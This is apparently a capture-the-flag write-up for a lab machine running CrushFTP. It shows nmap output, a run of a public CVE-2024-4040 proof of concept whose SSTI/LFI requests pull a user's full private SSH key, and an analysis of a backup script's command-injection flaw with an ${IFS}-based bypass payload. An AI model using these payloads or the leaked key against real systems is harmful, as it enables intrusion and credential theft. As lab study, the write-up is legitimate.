
```
└─$ nmap -sC -sV -Pn 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 16:46 EDT
Nmap scan report for 192.168.56.101
Host is up (0.0015s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5b:06:24:fb:69:10:41:88:c5:9c:29:ac:71:97:70:5f (ECDSA)
|_  256 d9:ba:86:c5:b2:e9:85:eb:26:8a:33:75:a7:85:99:43 (ED25519)
2222/tcp open  ssh                CrushFTP sftpd (protocol 2.0)
| ssh-hostkey: 
|_  4096 2c:62:35:08:57:bd:97:5e:23:37:9f:84:4d:32:ee:3d (RSA)
8080/tcp open  http               CrushFTP DAV httpd (User username)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: CrushFTP WebInterface
|_Requested resource was /WebInterface/login.html
| http-methods: 
|_  Potentially risky methods: PUT COPY PROPFIND DELETE LOCK MKCOL MOVE PROPPATCH UNLOCK ACL TRACE
|_http-trane-info: Problem with XML parsing of /evox/about
| http-webdav-scan: 
|   Allowed Methods: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE
|   WebDAV type: Apache DAV
|   Server Date: Tue, 21 May 2024 20:47:12 GMT
|_  Server Type: CrushFTP HTTP Server
9090/tcp open  hadoop-tasktracker Apache Hadoop (User username)
| http-webdav-scan: 
|   Allowed Methods: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE
|   WebDAV type: Apache DAV
|   Server Date: Tue, 21 May 2024 20:47:12 GMT
|_  Server Type: CrushFTP HTTP Server
| hadoop-tasktracker-info: 
|_  Logs: LoginButtonText
| http-methods: 
|_  Potentially risky methods: PUT COPY PROPFIND DELETE LOCK MKCOL MOVE PROPPATCH UNLOCK ACL TRACE
| hadoop-datanode-info: 
|_  Logs: LoginButtonText
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: CrushFTP WebInterface
|_Requested resource was /WebInterface/login.html
Service Info: Host: sslngn018; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.81 seconds

```

https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis

https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC?tab=readme-ov-file

https://private-user-images.githubusercontent.com/60468836/326194348-e507b6b4-37ad-4d5b-8447-926f5d05f2fb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTY0ODU3OTIsIm5iZiI6MTcxNjQ4NTQ5MiwicGF0aCI6Ii82MDQ2ODgzNi8zMjYxOTQzNDgtZTUwN2I2YjQtMzdhZC00ZDViLTg0NDctOTI2ZjVkMDVmMmZiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA1MjMlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNTIzVDE3MzEzMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFhNTA5OWJkNGZhMDE4NWJkODI1OTRkM2JkMjM3MGE2OTRiZTIyNWEwNTVhYzRmNWMwNjVlYTE0OWFhMzY1NGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.OizIjCvbaZmgf2wmm5k_GUhUl6tDRkcAlICvRlRZUqM



```
/var/opt/CrushFTP10/sessions.obj
```




SSH keys


private

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


public
```
ssh-rsa 
AAAAB3NzaC1yc2EAAAADAQABAAABgQDAcGSiSu2nwg8jjA2rFXjdCB4uTUYOQkdSXeeRQeZLh9vB5A3s+Z1frxm6a2kN4PLQreXQ9ZGydoE+Dn9UqAvnnHX6GMWC84qqJyhJaJJzk13IV
IV5T5QckG80WBhClUAmmWWvzDeDoqOP1xfyjB5nkIMS3AOfca4qCf5mnMTaXJXLpzAEWFezd7bLKvkGLYyMx8n1IUF94ggTz/sx0N2JS050buXYEk3v4c9N7avzlHXRc1cp4PvO/NtT7E
i51Su9XnbEaIq5TddDm1XqX87hLg8waf85ddYo44cu5TuCv8J+kbUoKwKj043e0d/XqZrt6lLJ+w3dKiQQrmmyUU5L21xWwnhk6XWM13jlgQPfnJOEYqfVJH2suGeTeqtYpmoRgr5NHym
7EAUS4ifs/AATF/FlYNeEteuptQZbKkDFbdIQZ3AJ2wCrdNKFwYJsJFY759VWUiFh3KOGxiKN5CcT36vSzYvoTCx9Dj9vgYYIO3/zV9CCTkAxuOBIMt64Qic= enzuu@crushed
```


```
┌──(kali㉿kali)-[~/CVE-2024-4040-SSTI-LFI-PoC]
└─$ python3 crushed.py -t http://192.168.56.101:8080/WebInterface/login.html --lfi /home/enzuu/.ssh/id_rsa


 ______     ______     __  __     ______     __  __     ______     _____    
/\  ___\   /\  == \   /\ \/\ \   /\  ___\   /\ \_\ \   /\  ___\   /\  __-.  
\ \ \____  \ \  __<   \ \ \_\ \  \ \___  \  \ \  __ \  \ \  __\   \ \ \/\ \ 
 \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_____\  \ \____- 
  \/_____/   \/_/ /_/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
                                                                            


    
CrushFTP SSTI PoC (CVE-2024-4040)
Developer: @stuub
Purely for ethical & educational purposes only


[*] Attempting to retrieve CrushAuth and currentAuth tokens...
[*] Attempting to reach ServerSessionAJAX...

[+] Successfully reached ServerSessionAJAX
[+] CrushAuth Session token: 1716549654868_rHQb27iGPU9YzRqttU9mukf4MGYWXb
[+] Current Auth Session token: YWXb

[*] Attempting to exploit SSTI vulnerability...

[+] URL: http://192.168.56.101:8080/WebInterface/function/?c2f=YWXb&command=zip&path={hostname}&names=/a
[+] Successfully exploited SSTI vulnerability
[+] Response: You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:crushed


[+] Attempting to extract users/MainUsers/groups.XML...

[+] URL: http://192.168.56.101:8080/WebInterface/function/?c2f=YWXb&command=zip&path=<INCLUDE>users/MainUsers/groups.XML</INCLUDE>&names=/a
[+] Successfully extracted users/MainUsers/groups.XML
[+] Extracted response: 
<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:<?xml version="1.0" encoding="UTF-8"?>
<groups type="properties"></groups>



</response></commandResult>

[*] Attempting to bypass authentication...

[+] URL: http://192.168.56.101:8080/WebInterface/function/?c2f=YWXb&command=zip&path={working_dir}&names=/a
[+] Extracted response: 
<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:/var/opt/CrushFTP10/
</response></commandResult>

[+] Installation directory of CrushFTP: /var/opt/CrushFTP10/
[+] File to read: /home/enzuu/.ssh/id_rsa

[+] Attempting to extract /home/enzuu/.ssh/id_rsa...

[+] URL: http://192.168.56.101:8080/WebInterface/function/?c2f=YWXb&command=zip&path=<INCLUDE>/home/enzuu/.ssh/id_rsa</INCLUDE>&names=/a
[+] Successfully extracted /home/enzuu/.ssh/id_rsa
[+] Extracted response: 
<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


</response></commandResult>


```



```
┌──(kali㉿kali)-[~/CVE-2024-4040-SSTI-LFI-PoC]
└─$ python3 crushed.py -t http://192.168.56.101:8080/WebInterface/login.html --lfi /home/enzuu/.ssh/id_rsa.pub


 ______     ______     __  __     ______     __  __     ______     _____    
/\  ___\   /\  == \   /\ \/\ \   /\  ___\   /\ \_\ \   /\  ___\   /\  __-.  
\ \ \____  \ \  __<   \ \ \_\ \  \ \___  \  \ \  __ \  \ \  __\   \ \ \/\ \ 
 \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_____\  \ \____- 
  \/_____/   \/_/ /_/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
                                                                            


    
CrushFTP SSTI PoC (CVE-2024-4040)
Developer: @stuub
Purely for ethical & educational purposes only


[*] Attempting to retrieve CrushAuth and currentAuth tokens...
[*] Attempting to reach ServerSessionAJAX...

[+] Successfully reached ServerSessionAJAX
[+] CrushAuth Session token: 1716549691057_eoVP7svjR9QZAofR1z6FnvO6idWJAJ
[+] Current Auth Session token: WJAJ

[*] Attempting to exploit SSTI vulnerability...

[+] Installation directory of CrushFTP: /var/opt/CrushFTP10/
[+] File to read: /home/enzuu/.ssh/id_rsa.pub

[+] Attempting to extract /home/enzuu/.ssh/id_rsa.pub...

[+] URL: http://192.168.56.101:8080/WebInterface/function/?c2f=WJAJ&command=zip&path=<INCLUDE>/home/enzuu/.ssh/id_rsa.pub</INCLUDE>&names=/a
[+] Successfully extracted /home/enzuu/.ssh/id_rsa.pub
[+] Extracted response: 
<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>You need download, upload permissions to zip a file:/a
You need upload permissions to zip a file:ssh-rsa 
AAAAB3NzaC1yc2EAAAADAQABAAABgQDAcGSiSu2nwg8jjA2rFXjdCB4uTUYOQkdSXeeRQeZLh9vB5A3s+Z1frxm6a2kN4PLQreXQ9ZGydoE+Dn9UqAvnnHX6GMWC84qqJyhJaJJzk13IV
IV5T5QckG80WBhClUAmmWWvzDeDoqOP1xfyjB5nkIMS3AOfca4qCf5mnMTaXJXLpzAEWFezd7bLKvkGLYyMx8n1IUF94ggTz/sx0N2JS050buXYEk3v4c9N7avzlHXRc1cp4PvO/NtT7E
i51Su9XnbEaIq5TddDm1XqX87hLg8waf85ddYo44cu5TuCv8J+kbUoKwKj043e0d/XqZrt6lLJ+w3dKiQQrmmyUU5L21xWwnhk6XWM13jlgQPfnJOEYqfVJH2suGeTeqtYpmoRgr5NHym
7EAUS4ifs/AATF/FlYNeEteuptQZbKkDFbdIQZ3AJ2wCrdNKFwYJsJFY759VWUiFh3KOGxiKN5CcT36vSzYvoTCx9Dj9vgYYIO3/zV9CCTkAxuOBIMt64Qic= enzuu@crushed


</response></commandResult>

```



```
enzuu@crushed:~$ cat /opt/scripts/util.py
import os
import shutil
import datetime
import subprocess
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def initialize_backup_directory(backup_dir):
    if not os.path.exists(backup_dir):
        logging.info(f"Creating backup directory at {backup_dir}")
        os.makedirs(backup_dir, exist_ok=True)

def run_backup():
    source_dir = '/var/opt/CrushFTP10'
    backup_dir = '/var/backups'
    
    initialize_backup_directory(backup_dir)
    
    timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
    backup_filename = f'backup_{timestamp}.tar.gz'
    backup_filepath = os.path.join(backup_dir, backup_filename)

    logging.info(f"Starting backup of {source_dir}")
    shutil.make_archive(backup_filepath[:-7], 'gztar', source_dir)

    logging.info(f"Backup of {source_dir} completed successfully. Saved as {backup_filepath}")

def clean_logs(log_file):
    if os.path.exists(log_file):
        logging.info(f"Cleaning log file: {log_file}")

        safe_log_file = log_file.replace(';', '').replace('&', '').replace('|', '').replace(" ", "_")
        
        log_size = os.path.getsize(log_file)
        logging.info(f"Log file size: {log_size} bytes")

        with open(log_file, 'r') as f:
            lines = f.readlines()
            logging.info(f"Log file has {len(lines)} lines")
        
        temp_log_file = f"/tmp/{os.path.basename(safe_log_file)}"
        shutil.copy(log_file, temp_log_file)
        
        with open(temp_log_file, 'r') as f:
            temp_lines = f.readlines()
            logging.info(f"Temporary log file has {len(temp_lines)} lines")
        
        remove_command = f"rm {temp_log_file} > /dev/null 2>&1"
        log_cleanup_command = f"echo 'Log cleanup' >> {safe_log_file}; {remove_command}"
        subprocess.run(log_cleanup_command, shell=True)
        logging.info(f"Log file {log_file} cleaned successfully.")
        
    else:
        logging.warning(f"Log file does not exist: {log_file}")

def display_menu():
    print("Choose an option:")
    print("1. Run Backup")
    print("2. Clean Logs")
    print("3. Exit")

def main():
    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == '1':
            run_backup()
        elif choice == '2':
            log_file = input("Enter the log file path: ")
            clean_logs(log_file)
        elif choice == '3':
            print("Exiting.")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()

```



# Lessons

always go to main function first to understand program flow


- Program flow
	- Always start from main
	- Trace diligently dont be a retard speedrunning


here are the following important code snippets


```
def main():
    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == '1':
            run_backup()
        elif choice == '2':
            log_file = input("Enter the log file path: ")
            clean_logs(log_file)   <-----------------------------
        elif choice == '3':
            print("Exiting.")
            break
        else:
            print("Invalid choice, please try again.")
```




```
def clean_logs(log_file):
    if os.path.exists(log_file):   
        logging.info(f"Cleaning log file: {log_file}")

        safe_log_file = log_file.replace(';', '').replace('&', '').replace('|', '').replace(" ", "_")
```

so here we can see that it takes `log_file` which is the input the user gives us, it first checks if the path exists using `os.path.exists(log_file)`, then  using `logging.info` it outputs the confirmation of the file, `safe_log_file` variable is then used to filter anything in the name of `log_file`, as can be seen here `log_file.replace(';', '').replace('&', '').replace('|', '').replace(" ", "_")`



```
        log_size = os.path.getsize(log_file)
        logging.info(f"Log file size: {log_size} bytes")

        with open(log_file, 'r') as f:
            lines = f.readlines()
            logging.info(f"Log file has {len(lines)} lines")
```

The following just outputs for us information about the file, it outputs the amount of bytes it has and its size. Then it gives us information on how many lines there are

```
        temp_log_file = f"/tmp/{os.path.basename(safe_log_file)}"
        shutil.copy(log_file, temp_log_file)
```

then the variable `temp_log_file`, which is a storing the `log_file` after it gets filtered hence its storing  `safe_log_file`. Then a copy of `log_file` is created and called `temp_log_file`

```
        with open(temp_log_file, 'r') as f:
            temp_lines = f.readlines()
            logging.info(f"Temporary log file has {len(temp_lines)} lines")
```

Then we read and see how many lines there are in the temporary file

```
        remove_command = f"rm {temp_log_file} > /dev/null 2>&1"
        log_cleanup_command = f"echo 'Log cleanup' >> {safe_log_file}; {remove_command}"
```

Here in this snippet is one of the most important ones, `remove_command` basically launched a command that deletes the `temp_log_file` and throws all of its output into `/dev/null 2>&1` so it would make sense why output wise we would not be able to see anything.

The next variable which is the `log_cleanup_command`, it basically cleans up everything inside of the log file which has the attribute `safe_log_file` using `>>` and then launches the `remove_command` variable


```
        subprocess.run(log_cleanup_command, shell=True)
        logging.info(f"Log file {log_file} cleaned successfully.")
```

Here we are just setting the `log_cleanup_command` to have `shell=True` attribute to have it launch a shell




## How to bypass?

We know the following is getting filtered

```
safe_log_file = log_file.replace(';', '').replace('&', '').replace('|', '').replace(" ", "_")
```

luckily I was able to find the following links, so we need a way to bypass spaces...

https://security.stackexchange.com/questions/219605/command-injection-filtering-bypass

so despite it being in python don't forget that its being launched in bash after all, so we need to find a environment variable that mimics space in this case its `$[IFS}`

so the name of the log will be `$(bash.log)`, so what will be executed is the bash file in this case, or if we wanna test if its even possible we can do `$(sleep${IFS}.log)`

we can test this in our own shell but doing `enzuu@crushed:/tmp$ cat $(sleep${IFS}5).log` and we can see that there IS a delay so this payload WOULD work.



in this case the name of the file is what were doing command injection, its what's being passed to the subprocess, specifically in this line

```
        log_cleanup_command = f"echo 'Log cleanup' >> {safe_log_file}; {remove_command}"
```